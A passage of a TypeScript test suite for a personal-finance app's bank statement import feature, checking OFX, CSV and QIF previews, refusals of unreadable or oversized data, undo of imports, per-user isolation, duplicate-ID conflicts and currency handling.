    expect((await routes.POST(new Request('http://localhost/api/import', { method: 'POST', body: noMeta }))).status).toBe(400);
    // A file that isn't a statement says why.
    const r = await preview(CHECKING.account_id, 'OFXHEADER:100\n\n<OFX></OFX>');
    expect(r.status).toBe(422);
    expect(r.body).toEqual({ error: 'This OFX file holds no bank or credit card statement.', format: 'ofx' });
  });

  test('an account whose transactions can’t be read is refused (409), never matched as empty', async () => {
    await fake.hset(ctxKey('manual-transactions'), { [CHECKING.account_id]: 'not-ciphertext-but-long-enough-to-be-tried' });
    const { result } = await quietly(() => preview(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(result.status).toBe(409);
    expect(result.body).toMatchObject({ unreadable: true, unreadable_ids: [CHECKING.account_id] });
    const { result: imported } = await quietly(() => importFile(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(imported.status).toBe(409);
    expect(await importStore.count(ctx)).toBe(0);
  });

  test('an import the account’s book can’t hold is refused whole with a clear message: nothing written, nothing trimmed', async () => {
    // A book of a hundred rows that don't compress, near a lowered ceiling.
    const filler = Array.from({ length: 100 }, () =>
      newManualTxn(CHECKING.account_id, { date: '2026-08-01', amount: 1, currency: 'USD', name: crypto.randomUUID(), category: null, note: crypto.randomUUID() })
    );
    await manualTxnStore.set(ctx, CHECKING.account_id, { version: 1, rows: filler });
    const stored = fake.hashes.get(ctxKey('manual-transactions'))!.get(CHECKING.account_id)!;
    process.env.MAX_TXN_BLOB_CHARS = String(stored.length + 60);
    const before = snapshot();
    const file = ofx([1, 2, 3].map((i) => ({ fitid: `S${i}`, date: '2026-09-0' + i, amount: -i, name: crypto.randomUUID() })));
    const { result, logged } = await quietly(() => importFile(CHECKING.account_id, file));
    expect(result.status).toBe(413);
    expect(result.body.error).toBe('Checking can’t take this import: with it, its transactions would be too large to store, so nothing was imported. Import a shorter period.');
    expect(logged).toContain('refusing to save manual-transactions');
    expect(changedKeys(before, snapshot())).toEqual([COUNTER]);
    expect(await book()).toEqual(filler);
    expect(await importStore.count(ctx)).toBe(0);
  });

  test('records too large to keep are refused before the book is touched', async () => {
    process.env.MAX_TXN_BLOB_CHARS = '400';
    const before = snapshot();
    const { result } = await quietly(() => importFile(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(result.status).toBe(413);
    expect(result.body.error).toBe('This file’s records are too large to keep with the import, so nothing was imported. Import a shorter period.');
    expect(changedKeys(before, snapshot())).toEqual([COUNTER]);
  });

  test('a write of the rows that fails leaves no record behind', async () => {
    // The book's compare-and-set fails as a storage blip would.
    const original = fake.eval.bind(fake);
    (fake as any).eval = async (script: string, keys: string[], args: string[]) => {
      if (script.startsWith('-- nya:repo-update-entries')) {
        delete (fake as any).eval;
        throw new Error('storage blip');
      }
      return original(script, keys, args);
    };
    const { result } = await quietly(() => importFile(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(result.status).toBe(500);
    expect(await importStore.count(ctx)).toBe(0);
    expect(await importSummaryStore.count(ctx)).toBe(0);
    expect(await book()).toEqual([]);
  });

  test('a write of the rows whose answer is lost after it landed keeps the record, listed with Undo', async () => {
    // The compare-and-set lands, then its answer never arrives.
    const original = fake.eval.bind(fake);
    (fake as any).eval = async (script: string, keys: string[], args: string[]) => {
      if (script.startsWith('-- nya:repo-update-entries')) {
        delete (fake as any).eval;
        await original(script, keys, args);
        throw new Error('connection lost');
      }
      return original(script, keys, args);
    };
    const { result } = await quietly(() => importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, {}, 'sept.ofx'));
    expect(result.status).toBe(500);
    const rows = await book();
    expect(rows).toHaveLength(8);
    const id = rows[0].import_id!;
    expect(await importStore.has(ctx, id)).toBe(true);
    expect((await list(CHECKING.account_id)).body.imports).toEqual([expect.objectContaining({ id, record: 'ok', file_name: 'sept.ofx', rows_now: 8 })]);
    expect((await undo({ account_id: CHECKING.account_id, import_id: id, confirm: true })).body).toMatchObject({ removed: 8 });
    expect(await book()).toEqual([]);
  });

  test('a file is never logged: not its rows, not its name, on any path', async () => {
    const marker = 'MARKER-7f3c9e1d';
    const file = ofx([{ fitid: 'L1', date: '2026-09-01', amount: -1, name: `${marker} shop` }]);
    const { logged } = await quietly(async () => {
      await preview(CHECKING.account_id, file, {}, `${marker}.ofx`);
      await importFile(CHECKING.account_id, file, {}, {}, `${marker}.ofx`);
      process.env.MAX_TXN_BLOB_CHARS = '300';
      await importFile(SAVINGS.account_id, file, {}, {}, `${marker}.ofx`);
      delete process.env.MAX_TXN_BLOB_CHARS;
      await fake.hset(ctxKey('manual-transactions'), { [VISA.account_id]: 'not-ciphertext-but-long-enough-to-be-tried' });
      await importFile(VISA.account_id, file, {}, {}, `${marker}.ofx`);
    });
    // The refusals were logged, as they should be, and said nothing of the file.
    expect(logged).toContain('refusing to save');
    expect(logged).toContain('Stored manual transactions unreadable');
    expect(logged).not.toContain(marker);
    expect(logged).not.toContain('L1');
  });
});

describe('the list of imports, and undo', () => {
  test('the list says what is left of each import; undo takes every row out, edited or moved, with its exclusions and its record', async () => {
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, {}, 'sept.ofx');
    const id = body.import_id as string;
    const typed = newManualTxn(CHECKING.account_id, { date: '2026-09-20', amount: 3, currency: 'USD', name: 'Typed by hand', category: null, note: null });
    await addManualTxn(ctx, typed);
    const rows = await book();
    const imported = rows.filter((r) => r.import_id === id);
    await editManualTxn(ctx, imported[0].id, { category: 'income' });
    await editManualTxn(ctx, imported[1].id, { account_id: SAVINGS.account_id }, { from: CHECKING.account_id });
    await setExcluded(ctx, imported[2].id, true);
    await setExcluded(ctx, typed.id, true);

    const listed = await list(CHECKING.account_id);
    expect(listed.status).toBe(200);
    expect(listed.body.imports).toEqual([
      expect.objectContaining({ id, record: 'ok', format: 'ofx', file_name: 'sept.ofx', counts: { imported: 8, present: 0, repeated: 1, unreadable: 0 }, rows_now: 8, edited_now: 2, moved_now: 1, statement: 'Checking ending 4567', taken_over: 0 }),
    ]);
    expect(listed.body.limits).toEqual({ max_bytes: MAX_FILE_BYTES, max_rows: 10_000 });
    // What Undo would do, asked first for the confirmation, changing nothing.
    const asked = await undoPlanOf(CHECKING.account_id, id);
    expect(asked.status).toBe(200);
    expect(asked.body.undo).toEqual({ record: 'ok', remove: 8, edited: 2, moved: 1, kept: [], restore: 0, incomplete: false });
    expect(await book()).toHaveLength(8);

    expect((await undo({ account_id: CHECKING.account_id, import_id: id })).status).toBe(400); // not confirmed
    const done = await undo({ account_id: CHECKING.account_id, import_id: id, confirm: true });
    expect(done.status).toBe(200);
    expect(done.body).toEqual({ removed: 8, edited: 2, moved: 1, kept: 0, restored: 0 });
    expect(await book()).toEqual([typed]);
    expect(await book(SAVINGS.account_id)).toEqual([]);
    expect(await txnAnnotationStore.has(ctx, imported[2].id)).toBe(false);
    expect(await txnAnnotationStore.has(ctx, typed.id)).toBe(true);
    expect(await importStore.has(ctx, id)).toBe(false);
    expect(await importSummaryStore.has(ctx, id)).toBe(false);
    expect((await list(CHECKING.account_id)).body.imports).toEqual([]);
    // Undone already: nothing to take out.
    expect((await undo({ account_id: CHECKING.account_id, import_id: id, confirm: true })).status).toBe(404);
  });

  test('an import is only undone on its own account', async () => {
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect((await undo({ account_id: SAVINGS.account_id, import_id: body.import_id, confirm: true })).status).toBe(404);
    expect(await book()).toHaveLength(8);
  });

  test('an import whose record is damaged is still listed and undone; one a later release wrote is listed and left alone', async () => {
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, {}, 'sept.ofx');
    const id = body.import_id as string;
    await fake.hset(ctxKey('imports'), { [id]: 'not-ciphertext-but-long-enough-to-be-tried' });
    // Listed from its summary, which never reads the records; the undo's plan
    // reads them, and says they can't be.
    expect((await list(CHECKING.account_id)).body.imports).toEqual([expect.objectContaining({ id, record: 'ok', rows_now: 8, file_name: 'sept.ofx' })]);
    expect((await undoPlanOf(CHECKING.account_id, id)).body.undo).toMatchObject({ record: 'unreadable', remove: 8 });
    expect((await undo({ account_id: CHECKING.account_id, import_id: id, confirm: true })).body).toMatchObject({ removed: 8 });
    expect(await importStore.has(ctx, id)).toBe(false);
    expect(await importSummaryStore.has(ctx, id)).toBe(false);

    // With its summary damaged too, it is listed from what the rows name.
    const third = (await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'))).body.import_id as string;
    await fake.hset(ctxKey('imports'), { [third]: 'not-ciphertext-but-long-enough-to-be-tried' });
    await fake.hset(ctxKey('import-summaries'), { [third]: 'not-ciphertext-but-long-enough-to-be-tried' });
    expect((await list(CHECKING.account_id)).body.imports).toEqual([expect.objectContaining({ id: third, record: 'unreadable', rows_now: 8, file_name: null })]);
    expect((await undo({ account_id: CHECKING.account_id, import_id: third, confirm: true })).body).toMatchObject({ removed: 8 });

    const second = (await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'))).body.import_id as string;
    await fake.hset(ctxKey('imports'), { [second]: await encrypt(JSON.stringify({ version: 2, from: 'a later release' })) });
    await fake.hset(ctxKey('import-summaries'), { [second]: await encrypt(JSON.stringify({ version: 2, from: 'a later release' })) });
    expect((await list(CHECKING.account_id)).body.imports).toEqual([expect.objectContaining({ id: second, record: 'unrecognised' })]);
    const { result } = await quietly(() => undo({ account_id: CHECKING.account_id, import_id: second, confirm: true }));
    expect(result.status).toBe(409);
    expect(result.body).toMatchObject({ unreadable: true, unrecognised_ids: [second] });
    expect(await book()).toHaveLength(8);
  });

  test('deleting the account deletes its imports’ records and settings, and leaves other accounts’ alone', async () => {
    const mine = (await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'))).body.import_id;
    const theirs = (await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv')).body.import_id;
    const res = await manualAccounts.DELETE(new Request('http://localhost/api/manual-accounts', { method: 'DELETE', body: JSON.stringify({ account_id: CHECKING.account_id }) }));
    expect(res.status).toBe(200);
    expect(await importStore.has(ctx, mine)).toBe(false);
    expect(await importSummaryStore.has(ctx, mine)).toBe(false);
    expect(await importSettingsStore.has(ctx, CHECKING.account_id)).toBe(false);
    expect(await importStore.has(ctx, theirs)).toBe(true);
    expect(await importSummaryStore.has(ctx, theirs)).toBe(true);
    expect(await importSettingsStore.has(ctx, VISA.account_id)).toBe(true);
  });
});

describe('one person’s imports are theirs alone', () => {
  test('the route is behind the session gate, and another container sees and undoes nothing of them', async () => {
    const { config } = await import('@/proxy');
    expect(new RegExp(`^${config.matcher[0]}$`).test('/api/import')).toBe(true);
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    const OTHER = { container: '3f0b8c1e-6d2a-4b5c-9e7f-0a1b2c3d4e5f' } as typeof ctx;
    const { listImports, undoImport, ImportNotFoundError } = await import('@/lib/import/commit');
    expect(await listImports(OTHER, CHECKING.account_id)).toEqual([]);
    expect(await importStore.count(OTHER)).toBe(0);
    expect(await undoImport(OTHER, CHECKING.account_id, body.import_id).catch((e) => e)).toBeInstanceOf(ImportNotFoundError);
    expect(await book()).toHaveLength(8);
    expect((await importStore.get(ctx, body.import_id))?.account_id).toBe(CHECKING.account_id);
  });
});

describe('racing other writers', () => {
  test('a row added between the preview and the import is matched against, never duplicated', async () => {
    const p = await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(p.body.preview.counts.new).toBe(8);
    await addManualTxn(ctx, newManualTxn(CHECKING.account_id, { date: '2026-09-15', amount: 500, currency: 'USD', name: 'Online transfer to sav 9876', category: 'transfer out', note: null }));
    expect((await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'))).body).toMatchObject({ imported: 7, present: 1 });
    expect(await book()).toHaveLength(8);
  });

  test('a row added while the import is being written: the compare-and-set reads again, both land, and the record says what happened', async () => {
    const typed = newManualTxn(CHECKING.account_id, { date: '2026-09-30', amount: -0.42, currency: 'USD', name: 'INTEREST PAID', category: null, note: null });
    atNextScript('repo-update-entries', () => addManualTxn(ctx, typed));
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(body).toMatchObject({ imported: 7, present: 1 });
    const rows = await book();
    expect(rows).toHaveLength(8);
    expect(rows[0]).toEqual(typed);
    const entry = (await importStore.get(ctx, body.import_id))!;
    expect(entry.counts).toEqual({ imported: 7, present: 1, repeated: 1, unreadable: 0 });
    expect(entry.records[8]).toMatchObject({ outcome: 'present', row_id: typed.id });
  });
});

describe('imported rows are ordinary manual rows everywhere', () => {
  test('in Activity, labelled, excludable, and kept to one currency in totals', async () => {
    const text = ['Date,Description,Amount,Currency', `${day(-3)},Corner shop,-12.50,USD`, `${day(-2)},Museum,-20.00,EUR`, `${day(-1)},Refund,5.00,USD`].join('\n');
    const options = { csv: { columns: { date: 0, description: 1, amount: 2, currency: 3 }, sign: 'negative-out' } };
    expect((await importFile(CHECKING.account_id, text, options, {}, 'trip.csv')).body.imported).toBe(3);
    const shop = (await book()).find((r) => r.name === 'Corner shop')!;
    const patched = await annotations.PATCH(new Request('http://localhost/api/transaction-annotations', { method: 'PATCH', body: JSON.stringify({ transaction_id: shop.id, excluded: true }) }));
    expect(patched.status).toBe(200);
    const res = await transactions.GET(new Request('http://localhost/api/transactions'));
    const shown = (await res.json()).transactions as any[];
    expect(shown.map((t) => [t.name, t.amount, t.iso_currency_code, t.source, t.account_name])).toEqual([
      ['Refund', -5, 'USD', 'import:csv', 'Checking'],
      ['Museum', 20, 'EUR', 'import:csv', 'Checking'],
      ['Corner shop', 12.5, 'USD', 'import:csv', 'Checking'],
    ]);
    expect(shown.find((t) => t.name === 'Corner shop').excluded).toBe(true);
    const currency = totalsCurrency(shown);
    expect(currency).toBe('USD');
    expect(shown.filter((t) => countsInTotals(t, currency)).map((t) => t.name)).toEqual(['Refund']);
  });
});

describe('a FITID on another stored transaction', () => {
  const sept = ofx([
    { fitid: '1', date: '2026-09-05', amount: -12.5, name: 'GROCER' },
    { fitid: '2', date: '2026-09-10', amount: -1500, name: 'RENT' },
    { fitid: '3', date: '2026-09-20', amount: 2400, name: 'PAYROLL' },
  ]);
  // The same bank numbers each download from 1 again.
  const oct = ofx([
    { fitid: '1', date: '2026-10-03', amount: -48.2, name: 'PHARMACY' },
    { fitid: '2', date: '2026-10-05', amount: -1500, name: 'RENT' },
    { fitid: '3', date: '2026-10-06', amount: -9.99, name: 'NETFLIX' },
    { fitid: '4', date: '2026-10-07', amount: 2400, name: 'PAYROLL' },
  ]);

  test('is never dropped as already there: listed, imported as new where nothing else is alike, and asked where something is', async () => {
    await importFile(CHECKING.account_id, sept);
    const p = (await preview(CHECKING.account_id, oct)).body.preview;
    expect(p.counts).toEqual({ new: 3, present: 0, repeated: 0, replaced: 0, skipped: 0, conflicts: 1, unreadable: 0 });
    expect(p.conflicts.map((c: any) => [c.index, c.file.name, c.stored.name, c.suggested, c.choice])).toEqual([
      [0, 'PHARMACY', 'GROCER', 'new', 'new'],
      [1, 'RENT', 'RENT', null, null],
      [2, 'NETFLIX', 'PAYROLL', 'new', 'new'],
    ]);
    expect(p.rows.map((r: any) => r.outcome)).toEqual(['new', 'conflict', 'new', 'new']);
    // Not imported until the one asked about has an answer, and nothing written.
    const before = snapshot();
    const refused = await importFile(CHECKING.account_id, oct);
    expect(refused.status).toBe(409);
    expect(refused.body).toEqual({
      error: 'One transaction in this file has a bank id (FITID) that is on another transaction already here. Choose what to do with it, then import.',
      needs: 'conflicts',
      conflicts: 1,
    });
    expect(changedKeys(before, snapshot())).toEqual([COUNTER]);
    const done = await importFile(CHECKING.account_id, oct, { conflicts: { each: { '1': 'new' } } });
    expect(done.body).toMatchObject({ imported: 4, present: 0, replaced: 0, skipped: 0 });
    expect((await book()).map((r) => [r.name, r.date])).toEqual([
      ['GROCER', '2026-09-05'],
      ['RENT', '2026-09-10'],
      ['PAYROLL', '2026-09-20'],
      ['PHARMACY', '2026-10-03'],
      ['RENT', '2026-10-05'],
      ['NETFLIX', '2026-10-06'],
      ['PAYROLL', '2026-10-07'],
    ]);
    // Both Octobers' files again: everything is there, by its FITID and day.
    expect((await preview(CHECKING.account_id, oct)).body.preview.counts).toMatchObject({ new: 0, present: 4, conflicts: 0 });
    expect((await preview(CHECKING.account_id, sept)).body.preview.counts).toMatchObject({ new: 0, present: 3, conflicts: 0 });
  });

  test('a pending charge that posted at a new amount: replaced with the file’s version when asked, and put back by Undo', async () => {
    const pending = await importFile(CHECKING.account_id, ofx([{ fitid: 'P9', date: '2026-10-01', amount: -50, name: 'BISTRO' }]), {}, {}, 'pending.ofx');
    const [stored] = await book();
    await editManualTxn(ctx, stored.id, { category: 'food and drink' });
    const posted = ofx([{ fitid: 'P9', date: '2026-10-03', amount: -60, name: 'BISTRO' }]);
    // Skipped: nothing changes, and nothing is kept of a file that changed nothing.
    expect((await importFile(CHECKING.account_id, posted, { conflicts: { all: 'skip' } })).body).toMatchObject({ imported: 0, skipped: 1, import_id: null });
    const done = await importFile(CHECKING.account_id, posted, { conflicts: { all: 'replace' } }, {}, 'posted.ofx');
    expect(done.body).toMatchObject({ imported: 0, replaced: 1 });
    const [replaced] = await book();
    // The same row, now as the bank posted it, with what the person gave it kept.
    expect(replaced).toMatchObject({ id: stored.id, amount: 60, date: '2026-10-03', name: 'BISTRO', category: 'food and drink', import_id: pending.body.import_id });
    const entry = (await importStore.get(ctx, done.body.import_id))!;
    expect(entry.counts).toEqual({ imported: 0, present: 0, repeated: 0, unreadable: 0, replaced: 1 });
    expect(entry.records[0]).toMatchObject({
      outcome: 'replaced',
      row_id: stored.id,
      before: { date: '2026-10-01', amount: 50, currency: 'USD', name: 'BISTRO', category: 'food and drink', note: null, transaction_code: null },
    });
    // Undo says it puts the row back, and does.
    expect((await undoPlanOf(CHECKING.account_id, done.body.import_id)).body.undo).toMatchObject({ remove: 0, restore: 1, kept: [] });
    expect((await undo({ account_id: CHECKING.account_id, import_id: done.body.import_id, confirm: true })).body).toEqual({ removed: 0, edited: 0, moved: 0, kept: 0, restored: 1 });
    expect(await book()).toEqual([expect.objectContaining({ id: stored.id, amount: 50, date: '2026-10-01', category: 'food and drink', import_id: pending.body.import_id })]);
  });
});

describe('undo keeps what a later import relied on', () => {
  const janMar = ofx([
    { fitid: 'F1', date: '2026-01-10', amount: -10, name: 'JAN' },
    { fitid: 'F2', date: '2026-02-10', amount: -20, name: 'FEB' },
    { fitid: 'F3', date: '2026-03-10', amount: -30, name: 'MAR' },
  ]);
  const febApr = ofx([
    { fitid: 'F2', date: '2026-02-10', amount: -20, name: 'FEB' },
    { fitid: 'F3', date: '2026-03-10', amount: -30, name: 'MAR' },
    { fitid: 'F4', date: '2026-04-10', amount: -40, name: 'APR' },
  ]);

  test('January to March, then February to April, then the first undone: February and March stay, for the second', async () => {
    const first = (await importFile(CHECKING.account_id, janMar, {}, {}, 'jan-mar.ofx')).body;
    const second = (await importFile(CHECKING.account_id, febApr, {}, {}, 'feb-apr.ofx')).body;
    expect(first).toMatchObject({ imported: 3 });
    expect(second).toMatchObject({ imported: 1, present: 2 });
    // The confirmation says what stays, and why.
    const plan = (await undoPlanOf(CHECKING.account_id, first.import_id)).body.undo;
    expect(plan).toEqual({
      record: 'ok',
      remove: 1,
      edited: 0,
      moved: 0,
      kept: [{ import_id: second.import_id, file_name: 'feb-apr.ofx', imported_at: expect.any(String), count: 2 }],
      restore: 0,
      incomplete: false,
    });
    expect((await undo({ account_id: CHECKING.account_id, import_id: first.import_id, confirm: true })).body).toEqual({ removed: 1, edited: 0, moved: 0, kept: 2, restored: 0 });
    expect((await book()).map((r) => [r.name, r.import_id])).toEqual([
      ['FEB', second.import_id],
      ['MAR', second.import_id],
      ['APR', second.import_id],
    ]);
    // The second import now holds them, says so, and its Undo takes them out.
    expect((await list(CHECKING.account_id)).body.imports).toEqual([expect.objectContaining({ id: second.import_id, taken_over: 2, rows_now: 3, counts: expect.objectContaining({ imported: 1, present: 2 }) })]);
    expect((await undoPlanOf(CHECKING.account_id, second.import_id)).body.undo).toMatchObject({ remove: 3, kept: [] });
    expect((await undo({ account_id: CHECKING.account_id, import_id: second.import_id, confirm: true })).body).toMatchObject({ removed: 3, kept: 0 });
    expect(await book()).toEqual([]);
  });

  test('the later one undone first takes only what it added', async () => {
    const first = (await importFile(CHECKING.account_id, janMar, {}, {}, 'jan-mar.ofx')).body;
    const second = (await importFile(CHECKING.account_id, febApr, {}, {}, 'feb-apr.ofx')).body;
    expect((await undo({ account_id: CHECKING.account_id, import_id: second.import_id, confirm: true })).body).toMatchObject({ removed: 1, kept: 0 });
    expect((await book()).map((r) => [r.name, r.import_id])).toEqual([
      ['JAN', first.import_id],
      ['FEB', first.import_id],
      ['MAR', first.import_id],
    ]);
  });

  test('a later import whose record can’t be read could have relied on any row, so the undo is refused rather than guessed', async () => {
    const first = (await importFile(CHECKING.account_id, janMar, {}, {}, 'jan-mar.ofx')).body;
    const second = (await importFile(CHECKING.account_id, febApr, {}, {}, 'feb-apr.ofx')).body;
    await fake.hset(ctxKey('imports'), { [second.import_id]: 'not-ciphertext-but-long-enough-to-be-tried' });
    const { result } = await quietly(() => undo({ account_id: CHECKING.account_id, import_id: first.import_id, confirm: true }));
    expect(result.status).toBe(409);
    expect(await book()).toHaveLength(4);
  });
});

describe('the list of imports reads summaries, never a file’s records', () => {
  test('with every import’s records damaged, the list still says what each was', async () => {
    const a = (await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, {}, 'sept.ofx')).body.import_id;
    const b = (await importFile(CHECKING.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv')).body.import_id;
    await fake.hset(ctxKey('imports'), { [a]: 'not-ciphertext-but-long-enough-to-be-tried', [b]: 'not-ciphertext-but-long-enough-to-be-tried' });
    // Every key the list reads, by any command the seam sends.
    const reads: string[] = [];
    const spy = (name: 'hget' | 'hgetall' | 'eval') => {
      const original = (fake as any)[name].bind(fake);
      (fake as any)[name] = async (first: unknown, ...rest: unknown[]) => {
        if (name === 'eval') reads.push(...(rest[0] as string[]));
        else reads.push(first as string);
        return original(first, ...rest);
      };
    };
    for (const name of ['hget', 'hgetall', 'eval'] as const) spy(name);
    const listed = (await list(CHECKING.account_id)).body.imports;
    for (const name of ['hget', 'hgetall', 'eval']) delete (fake as any)[name];
    expect(listed.map((i: any) => [i.file_name, i.record])).toEqual(
      expect.arrayContaining([
        ['sept.ofx', 'ok'],
        ['card.csv', 'ok'],
      ])
    );
    expect(reads).toContain(ctxKey('import-summaries'));
    expect(reads).not.toContain(ctxKey('imports'));
  });
});

describe('a file that doesn’t say its currency', () => {
  const european = '!Type:Bank\nD13.09.2026\nT-1.234,50\nPMIETE\n^\nD14.09.2026\nT-45,00\nPREWE\n^\n';

  test('a QIF file is read in the currency chosen, which the preview says was chosen, and the account remembers', async () => {
    const asIs = (await preview(CHECKING.account_id, european, {}, 'umsatz.qif')).body.preview;
    expect(asIs).toMatchObject({ currency: 'USD', currency_from: 'default' });
    const chosen = (await preview(CHECKING.account_id, european, { currency: 'EUR' }, 'umsatz.qif')).body.preview;
    expect(chosen).toMatchObject({ currency: 'EUR', currency_from: 'chosen', read: { date_order: 'dmy', order_open: false, decimal: ',' } });
    expect((await importFile(CHECKING.account_id, european, { currency: 'EUR' }, {}, 'umsatz.qif')).body).toMatchObject({ imported: 2 });
    expect((await book()).map((r) => [r.name, r.amount, r.currency, r.date])).toEqual([
      ['MIETE', 1234.5, 'EUR', '2026-09-13'],
      ['REWE', 45, 'EUR', '2026-09-14'],
    ]);
    expect((await list(CHECKING.account_id)).body.settings.qif).toEqual({ date_order: 'dmy', decimal: ',', flip: false, currency: 'EUR' });
  });

  test('an OFX file without CURDEF the same; one that says its currency is read in it, whatever is sent', async () => {
    const without = ofx([{ fitid: 'G1', date: '2026-09-02', amount: -12, name: 'TESCO' }]).replace('<CURDEF>USD</CURDEF>', '');
    expect((await preview(CHECKING.account_id, without)).body.preview).toMatchObject({ currency: 'USD', currency_from: 'default' });
    expect((await importFile(CHECKING.account_id, without, { currency: 'GBP' })).body).toMatchObject({ imported: 1 });
    expect((await book())[0]).toMatchObject({ name: 'TESCO', currency: 'GBP' });
    expect((await list(CHECKING.account_id)).body.settings.ofx).toMatchObject({ currency: 'GBP' });
    const says = ofx([{ fitid: 'U1', date: '2026-09-03', amount: -5, name: 'DINER' }]);
    expect((await preview(CHECKING.account_id, says, { currency: 'EUR' })).body.preview).toMatchObject({ currency: 'USD', currency_from: 'file' });
  });
});

describe('what an OFX file’s own types and structure say, through the route', () => {
  test('transfers, cash and fees are counted for the preview, stored with what the spending rules read, and shown so', async () => {
    const file = ofx([
      { fitid: 'K1', date: day(-5), amount: -4.5, name: 'COFFEE' },
      { fitid: 'K2', date: day(-4), amount: -500, name: 'TRANSFER TO SAVINGS' },
      { fitid: 'K3', date: day(-3), amount: -60, name: 'ATM WITHDRAWAL' },
      { fitid: 'K4', date: day(-2), amount: -3, name: 'ATM FEE' },
    ])
      .replace('<TRNTYPE>DEBIT</TRNTYPE><DTPOSTED>' + compact(day(-4)), '<TRNTYPE>XFER</TRNTYPE><DTPOSTED>' + compact(day(-4)))
      .replace('<TRNTYPE>DEBIT</TRNTYPE><DTPOSTED>' + compact(day(-3)), '<TRNTYPE>ATM</TRNTYPE><DTPOSTED>' + compact(day(-3)))
      .replace('<TRNTYPE>DEBIT</TRNTYPE><DTPOSTED>' + compact(day(-2)), '<TRNTYPE>FEE</TRNTYPE><DTPOSTED>' + compact(day(-2)));
    expect((await preview(CHECKING.account_id, file)).body.preview.kinds).toEqual({ transfers: 1, atm: 1, payments: 0, fees: 1 });
    await importFile(CHECKING.account_id, file);
    expect((await book()).map((r) => [r.name, r.category, r.transaction_code ?? null])).toEqual([
      ['COFFEE', null, null],
      ['TRANSFER TO SAVINGS', 'transfer out', null],
      ['ATM WITHDRAWAL', 'transfer out', 'atm'],
      ['ATM FEE', 'bank fees', null],
    ]);
    const shown = (await (await transactions.GET(new Request('http://localhost/api/transactions'))).json()).transactions as any[];
    expect(shown.find((t) => t.name === 'ATM WITHDRAWAL')).toMatchObject({ transaction_code: 'atm', category: 'transfer out' });
    expect(shown.filter((t) => countsInTotals(t, 'USD')).map((t) => t.name).sort()).toEqual(['ATM FEE', 'COFFEE']);
  });

  test('transactions left unended are all read, and the preview says the file was repaired', async () => {
    const unended = ofx([1, 2, 3].map((i) => ({ fitid: `U${i}`, date: `2026-09-0${i}`, amount: -i, name: `SHOP ${i}` }))).replace(/<\/STMTTRN>/g, '');
    const p = (await preview(CHECKING.account_id, unended)).body.preview;
    expect(p.counts).toMatchObject({ new: 3, unreadable: 0 });
    expect(p.warnings).toEqual(['3 transactions in this file have no end tag (</STMTTRN>), so each was read up to the next one. Check the rows below.']);
  });
});
